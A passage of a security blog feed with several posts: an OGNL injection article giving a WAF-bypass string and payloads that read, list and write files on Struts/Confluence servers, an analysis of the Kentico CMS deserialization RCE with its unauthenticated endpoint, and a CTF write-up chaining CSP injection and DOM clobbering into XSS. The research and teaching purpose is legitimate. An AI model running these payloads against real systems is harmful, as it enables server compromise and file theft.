&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;true.toString().charAt(0).toChars(106)[0].toString().concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(118)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(108)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(103)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(82)[0].toString()).concat(true.toString().charAt(0).toChars(117)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(116)[0].toString()).concat(true.toString().charAt(0).toChars(105)[0].toString()).concat(true.toString().charAt(0).toChars(109)[0].toString()).concat(true.toString().charAt(0).toChars(101)[0].toString())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This trick is also mentioned in 2020 by the researcher Will Boucher in &lt;a href=&quot;https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass&quot;&gt;this blog post&lt;/a&gt; on how to bypass WAF when there’s an EL Injection.&lt;/p&gt;

&lt;h3 id=&quot;http-output-of-executed-commands-in-ognl&quot;&gt;HTTP output of executed commands in OGNL.&lt;/h3&gt;
&lt;p&gt;One thing those bypasses and payloads doesn’t mention is how to get the output of the commands as HTTP output when the result of the OGNL evaluation is not reflected.&lt;/p&gt;

&lt;p&gt;Here I describe two ways, the first to get the output of a &lt;code class=&quot;highlighter-rouge&quot;&gt;String&lt;/code&gt; via HTTP output:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#output=#o).(#strIs=new java.io.ByteArrayInputStream(@java.lang.String@valueOf(#output).getBytes())).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#strIs,#ros)).(#ros.flush())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And a second one for getting the HTTP output of a &lt;code class=&quot;highlighter-rouge&quot;&gt;ByteArray&lt;/code&gt; stream, to download or read a binary file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#output=#o).(#strIs=new java.io.ByteArrayInputStream(#output)).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#strIs,#ros)).(#ros.flush())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;alternative-ognl-primitives-to-avoid-executing-commands&quot;&gt;Alternative OGNL primitives to avoid executing commands.&lt;/h3&gt;

&lt;p&gt;Both &lt;code class=&quot;highlighter-rouge&quot;&gt;ProcessBuilder&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;freemarker.template.utility.Execute&lt;/code&gt; ends up creating a subprocess of &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; and calling the corresponding command to get it’s output. This behavior could be detected by EDR/XDR software as pontentially malicious behavior.&lt;/p&gt;

&lt;h4 id=&quot;list-files-ls&quot;&gt;List files (ls)&lt;/h4&gt;
&lt;p&gt;To list files as &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; command does, we need to use an OGNL loop over to read the desired directory.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#fol = new java.io.File('#{ls_path}')).(#fileNames = #fol.list()).(#finalStr=@java.lang.String@valueOf('')).(#i=0).(#fileNames.{(#c=#fileNames[#i]).(#i=#i+1).(#finalStr=#finalStr.concat(#c+\&quot;\\n\&quot;))}).(#o=#finalStr)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file names are stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;#o&lt;/code&gt;, then use the HTTP output primitive to print them over HTTP.&lt;/p&gt;

&lt;h4 id=&quot;read-files-cat&quot;&gt;Read files (cat)&lt;/h4&gt;
&lt;p&gt;Get the file as &lt;code class=&quot;highlighter-rouge&quot;&gt;ByteArray&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#f=new java.io.File('&amp;lt;file_to_read&amp;gt;')).(#o=@org.apache.commons.io.FileUtils@readFileToByteArray(#f))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then use the &lt;code class=&quot;highlighter-rouge&quot;&gt;ByteArray&lt;/code&gt; HTTP output primitive to output the file.&lt;/p&gt;

&lt;h4 id=&quot;get-current-directory-pwd&quot;&gt;Get current directory (pwd)&lt;/h4&gt;
&lt;p&gt;This is a simple one:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#pwd = new java.io.File('.').getCanonicalPath()).(#o=#pwd)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;write-file-using-a-custom-header&quot;&gt;Write file, using a custom header.&lt;/h4&gt;
&lt;p&gt;This payload will get the file data stored in a custom header named &lt;code class=&quot;highlighter-rouge&quot;&gt;Data&lt;/code&gt; and write it to the desired file path and name.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader('Data')).(#f=new java.io.FileWriter('&amp;lt;path to write&amp;gt;',true)).(#f.write(#data)).(#f.close())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;How about using Base64 to decode the &lt;code class=&quot;highlighter-rouge&quot;&gt;Data&lt;/code&gt; header and allow writing binary data? This is an exercise to the reader!&lt;/p&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;CVE-2017-5638: https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede&lt;/li&gt;
  &lt;li&gt;(S2-057) CVE-2018-11776: https://isecurity.huawei.com/sec/web/viewBlog.do?id=1857&lt;/li&gt;
  &lt;li&gt;https://securitylab.github.com/research/apache-struts-CVE-2018-11776/&lt;/li&gt;
  &lt;li&gt;(S2-059) CVE-2019-0230 https://www.tenable.com/blog/cve-2019-0230-apache-struts-potential-remote-code-execution-vulnerability&lt;/li&gt;
  &lt;li&gt;(S2-061) CVE-2020-17530: - https://blog.qualys.com/vulnerabilities-threat-research/2021/09/21/apache-struts-2-double-ognl-evaluation-vulnerability-cve-2020-17530&lt;/li&gt;
  &lt;li&gt;https://securitylab.github.com/research/ognl-injection-apache-struts/&lt;/li&gt;
  &lt;li&gt;https://securitylab.github.com/research/apache-struts-double-evaluation/&lt;/li&gt;
  &lt;li&gt;https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/&lt;/li&gt;
  &lt;li&gt;https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html&lt;/li&gt;
&lt;/ul&gt;</content>

      
      
      
      
      

      

      
        <category term="web" />
      
        <category term="struts" />
      
        <category term="ognl" />
      
        <category term="confluence" />
      

      

      
        <summary type="html">OGNL stands for Object-Graph Navigation Language and it’s a widely used expression language in the Java web world. Its main ability is to provide advanced functionalities on web template rendering, specially on Struts 2 framework and Atlassian WebWork.</summary>
      

      
      
    </entry>
  
  
  
    <entry>
      
      <title type="html">Analysis and explotation of 2019-10068, a Remote Command Execution in Kentico CMS &amp;lt;= 12.04</title>
      
      
      <link href="http://localhost:4000/2019/10/25/kentico-cms-rce/" rel="alternate" type="text/html" title="Analysis and explotation of 2019-10068, a Remote Command Execution in Kentico CMS &lt;= 12.04" />
      
      <published>2019-10-25T13:00:00+02:00</published>
      <updated>2019-10-25T13:00:00+02:00</updated>
      <id>http://localhost:4000/2019/10/25/kentico-cms-rce</id>
      <content type="html" xml:base="http://localhost:4000/2019/10/25/kentico-cms-rce/">&lt;p&gt;During a Red Team assesment, it’s important to be able to investigate and successfully exploit public but undisclosed bugs. In this case, I’m going to explain the methodology for analyzing and exploit an undisclosed bug on Kentico CMS, a .NET based enterprise CMS, let’s go!&lt;/p&gt;

&lt;p&gt;Firts of all, let’s read the CVE description about the bug:&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;An issue was discovered in Kentico before 12.0.15. Due to a failure to validate 
security headers, it was possible for a specially crafted request to the staging 
service to bypass the initial authentication and proceed to deserialize 
user-controlled .NET object input. This deserialization then led to unauthenticated 
remote code execution on the server where the Kentico instance was hosted.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok so this bug it’s about a .NET unsafe deserialization bug before Kentico 12.0.15. From a black-box perspective it could be really time consuming to find all the unauthenticated endpoints and exploit them, so I will need to download a trial version. I was lucky as there were a Kentico 11 (which is vulnerable too) demo available to download… well, not really, but changing the version number when downloading from Kentico demo website just serves an older version of the CMS, let’s say that this is kind of an easter egg.&lt;/p&gt;

&lt;p&gt;I also downloaded two hotfixes, available on Kentico website, this hotfixes are for 12.0.15 (the fixed version) and for 12.0.14 (the unfixed one), so we can apply “diff” over the DLLs and see which code changes between this two patches.&lt;/p&gt;

&lt;p&gt;Reading a bit more about the vulnerability, I found it’s caused by an usafe SOAP deserialization:&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; An XML encoded SOAP message within an element of the actual SOAP body was being 
 deserialized by a SOAP Action within the staging web service. The staging service 
 is used by the application to synchronize changes between different environments 
 or servers. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now I know I’m looking for a SoapFormatter .NET serializer/unserializer, half of the way done thanks to this description.&lt;/p&gt;

&lt;p&gt;Software I used for this analysis:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;JustAssembly for .NET DLLs diffing.&lt;/li&gt;
  &lt;li&gt;JustDecompile for .NET DLLs decompile to C# readable code and functions finding.&lt;/li&gt;
  &lt;li&gt;Kentico CMS hotfixes and Demo version for dynamic analysis and testing.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;JustDecompile let’s you open a whole .NET compiled project and look for strings, functions, variables… I opened the DLLs contained inside 12.0.5 patch, they are at Kentico/Hotfix120_15/DLLs/NET461. Open JustDecompile, click on Open… &amp;gt; File(s)…, and select all the DLLs inside the folder.&lt;/p&gt;

&lt;p&gt;Then, click on Search… and type SoapFormatter, it will look for SoapFormatter functions in the whole project. I had luck that there where only two uses of this function inside CMS.Synchronization.dll module, so it seems that this module is the vulnerable one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/kentico/1.png?raw=true&quot; alt=&quot;soapformatter&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This function is used inside StagingTaskData class, inside a wrapper Deserialize private method of this class.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/kentico/2.png?raw=true&quot; alt=&quot;deserialize1205&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s compare the CMS.Synchorization.dll between 12.0.15 hotfix and 12.0.14 hotfix to look if this Deserialization method on StagingTaskData have any difference. To do that I used JustAssembly, it let you select two DLLs and it will diff it in a visual way and show you which functions changed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/kentico/3.png?raw=true&quot; alt=&quot;diff&quot; /&gt;
&lt;img src=&quot;https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/kentico/4.png?raw=true&quot; alt=&quot;diff&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So it’s clear, this is the function we were looking for, on 12.0.15 (right), they added a middleware class which verifies the StagingTaskData object being received, instead of the raw string deserialization on 12.0.14 (left).&lt;/p&gt;

&lt;p&gt;Well, it’s time to find were StagingTaskData objects are instantiated, JustDecompile lets you look for cross-references to classes to see where are they instantiated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/kentico/5.png?raw=true&quot; alt=&quot;usages&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First match is on CMS.Synchronization.WSE3.dll module, on SyncClient and SyncServer classes, let’s open this module and those classes on JustDecompile to see what are they doing.&lt;/p&gt;

&lt;p&gt;On SyncSever class, I find the ULR endpoint to reach its methods, so now I know how to reach a method that uses StagingTaskData, seems the right way.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/kentico/6.png?raw=true&quot; alt=&quot;syncserver&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking a bit deeper on SyncServer class methods, I found the ProcessSynchronizationTaskData method, which receives a SERIALIZED StagingTaskData object string as parameter, and instantiates, here we have our unauthenticated endpoint to deserialize an unsanitized object.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/kentico/7.png?raw=true&quot; alt=&quot;processsync&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To test if we can reach this URL by default and also test if my assumtions were true, I’ll use the Kentico CMS 11 demo downloaded before. To reach the endpoint, let’s visit /SyncWebService/SyncServer and… oops! 404. Investigating on Kentico CMS API, I found it uses a baseURL for Staging service at /CMSPages/Staging/, so the final URL for the ASMX method is: /CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData. This endpoint will receive the derialized object via POST request.&lt;/p&gt;

&lt;p&gt;Let’s then generate a sample evil serialized XML SOAP object string using ysoserial.net with the ActivitySurrogateSelector as gadget and SoapFormatter as payload format.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData HTTP/1.1
Host: ...
...
...

stagingTaskData=&amp;lt;ysoserial.net payload here&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hope you learned something more about .NET applications analysis, this was my first time analyzing a real-world .NET application from stratch to find a RCE bug, so everything was new for me.&lt;/p&gt;

&lt;p&gt;Ping me if you find something wrong at gongarcialeon@gmail.com, bye!&lt;/p&gt;</content>

      
      
      
      
      

      

      
        <category term="web" />
      
        <category term=".net" />
      
        <category term="unserialize" />
      

      

      
        <summary type="html">During a Red Team assesment, it’s important to be able to investigate and successfully exploit public but undisclosed bugs. In this case, I’m going to explain the methodology for analyzing and exploit an undisclosed bug on Kentico CMS, a .NET based enterprise CMS, let’s go!</summary>
      

      
      
    </entry>
  
  
  
    <entry>
      
      <title type="html">[CTF Write-up] Midnightsun CTF Finals Marcololo (web. mid)</title>
      
      
      <link href="http://localhost:4000/2019/06/15/midnightsunctf-marcololo/" rel="alternate" type="text/html" title="[CTF Write-up] Midnightsun CTF Finals Marcololo (web. mid)" />
      
      <published>2019-06-15T13:00:00+02:00</published>
      <updated>2019-06-15T13:00:00+02:00</updated>
      <id>http://localhost:4000/2019/06/15/midnightsunctf-marcololo</id>
      <content type="html" xml:base="http://localhost:4000/2019/06/15/midnightsunctf-marcololo/">&lt;p&gt;This weekend, Midnightsun CTF Finals took place, a really funny CTF in Stockholm, a lovely place to visit.&lt;/p&gt;

&lt;p&gt;Marcololo task had the following statement:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;How slow is your metabolism?
Service: http://marcololo-01.play.midnightsunctf.se:3001
Author: avlidienbrunn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When accesing the challenge website, the following form was shown:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/dreadlocked/dreadlocked.github.io/blob/master/images/midnightsunctf/image1.png?raw=true&quot; alt=&quot;initial_form&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So it seems we need to submit a URL that triggers an alert(1) using XSS to to this form. Also, it indicates us where the actual challenge is, at ```http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=marcololo``&lt;/p&gt;

&lt;p&gt;This webpage returned the following HTTP response:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
X-Powered-By: Express
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Content-Type: text/html; charset=utf-8
Content-Length: 390
ETag: W/&quot;186-zb58dqJWgRpwGL9cKYBdnemMbKQ&quot;
Date: Sun, 16 Jun 2019 16:16:25 GMT
Connection: close


&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/static/style.css&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;property=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;og:title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;marcololo&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://code.jquery.com/jquery-2.2.4.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/api/getuser&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u are not admin, fak off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, if &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name == admin&lt;/code&gt; condition returns true, then, &lt;code class=&quot;highlighter-rouge&quot;&gt;$.get(location.hash.slice(1))&lt;/code&gt; will be executed. This &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name&lt;/code&gt; object, came from &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;, this javascript just returned an object with the following attributes: &lt;code class=&quot;highlighter-rouge&quot;&gt;user = {&quot;id&quot;:&quot;-1&quot;, &quot;name&quot;: &quot;guest&quot;, &quot;type&quot;: &quot;guest&quot;}&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash.slice(1)&lt;/code&gt; is the first string before “#” element on the URL.&lt;/p&gt;

&lt;p&gt;But where’s the XSS here?&lt;/p&gt;

&lt;p&gt;Ok, if you see, the &lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; parameter is being reflected, but unfortunetly, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;,&amp;gt; and /&lt;/code&gt; characters are filtered on the response, so simply injecting &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/code&gt; will not work.&lt;/p&gt;

&lt;p&gt;There needs to be another path… Did you notice that jQuery version?, 2.2.4 seems a bit old right? Yes, and it has an XSS vulnerability! Bingo!. On jQuery 2.2.4, if a user GET a resource and the Content-Type response header is &lt;code class=&quot;highlighter-rouge&quot;&gt;text/javascript&lt;/code&gt;, jQuery will simply eval the response as javascript, I developed a quick dummy TCP server that always returns:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.0 200 OK
Content-Type: text/javascript
Access-Control-Allow-Origin: *

alert(1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I tested it on Chrome’s console, doing &lt;code class=&quot;highlighter-rouge&quot;&gt;$.get(&quot;http://&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot;)&lt;/code&gt;, and it worked!! XSS executed!!&lt;/p&gt;

&lt;p&gt;Well, first problem seems to be solved, now we know how to trigger an XSS. But not that fast, now we need to figure out how to bypass that &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name == admin&lt;/code&gt; check.&lt;/p&gt;

&lt;p&gt;If you rememeber, we can reflect on the &lt;code class=&quot;highlighter-rouge&quot;&gt;content=&lt;/code&gt; attribute of the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag, so: How about injecting other meta attributes? Like, for expample, &lt;code class=&quot;highlighter-rouge&quot;&gt;http-equiv&lt;/code&gt; which will let us to mimic a response header. At first, we think that maybe abusing XSS Auditor on filter mode (the default mode on latest Chrome browser versions) could help us on filtering the  &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; so we tried to inject &lt;code class=&quot;highlighter-rouge&quot;&gt;1&quot; http-equiv=&quot;X-XSS-Protection&quot; p=&quot;&lt;/code&gt;, but it doesn’t work, as the server was already setting an &lt;code class=&quot;highlighter-rouge&quot;&gt;X-XSS-Protection&lt;/code&gt; header, an headers always overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;http-quiv&lt;/code&gt; meta tag attribute.&lt;/p&gt;

&lt;p&gt;Then, I realized that injecting a CSP policy constraining current domain scripts but allowing .jquery.com ones, could prevent &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; from loading, but jqeury will be allowed. Also, inline scripts and eval should be allowed, as jQuery bug is triggered beacuse an eval function. Injecting the following CSP header on the meta tag should do the job: &lt;code class=&quot;highlighter-rouge&quot;&gt;default-src 'unsafe-eval' 'unsafe-inline' *.jquery.com &quot;&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot; http-equiv=&quot;Content-Security-Policy&lt;/code&gt;. This worked!! Now Chrome is preventing &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;to load, as it comes from &lt;code class=&quot;highlighter-rouge&quot;&gt;http://marcololo-01.play.midnightsunctf.se:3001&lt;/code&gt; and CSP doesn’t allow this URL and also, doesn’t explicity allow &lt;code class=&quot;highlighter-rouge&quot;&gt;'self'&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;But now, &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name&lt;/code&gt; doesn’t exists, as this object is not loaded anymore. This can be workarounded using the old friend, Dom Clobbering. If we also inject &lt;code class=&quot;highlighter-rouge&quot;&gt;id=name name=admin&lt;/code&gt; on the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag, javascript will be able to access &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name&lt;/code&gt; attribute, and it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;!!&lt;/p&gt;

&lt;p&gt;We tested it and boom! It worked!!!&lt;/p&gt;

&lt;p&gt;The final URL (without urlencode for legibility) is:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=default-src 'unsafe-eval' 'unsafe-inline' *.jquery.com &amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot; http-equiv=&quot;Content-Security-Policy&quot; id=user name=admin p=&quot;#http://&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When submitting the flag on the initial form, it shows us the flag.&lt;/p&gt;

&lt;p&gt;Thanks to &lt;code class=&quot;highlighter-rouge&quot;&gt;@avlidienbrunn&lt;/code&gt; for the challenge and kudos to ID-10-T team for being such a great people.&lt;/p&gt;</content>

      
      
      
      
      

      

      
        <category term="web" />
      
        <category term="ctf" />
      
        <category term="xss" />
      
        <category term="clobbering" />
      

      

      
        <summary type="html">This weekend, Midnightsun CTF Finals took place, a really funny CTF in Stockholm, a lovely place to visit.</summary>
      

      
      
    </entry>
  
  
  
    <entry>
      
      <title type="html">[CTF Write-up] Midnightsun CTF Quals- Cloudb (web. hard)</title>
      
      
      <link href="http://localhost:4000/2019/04/20/midnisghtsunctf-cloudb/" rel="alternate" type="text/html" title="[CTF Write-up] Midnightsun CTF Quals- Cloudb (web. hard)" />
      
      <published>2019-04-20T14:00:00+02:00</published>
      <updated>2019-04-20T14:00:00+02:00</updated>
      <id>http://localhost:4000/2019/04/20/midnisghtsunctf-cloudb</id>
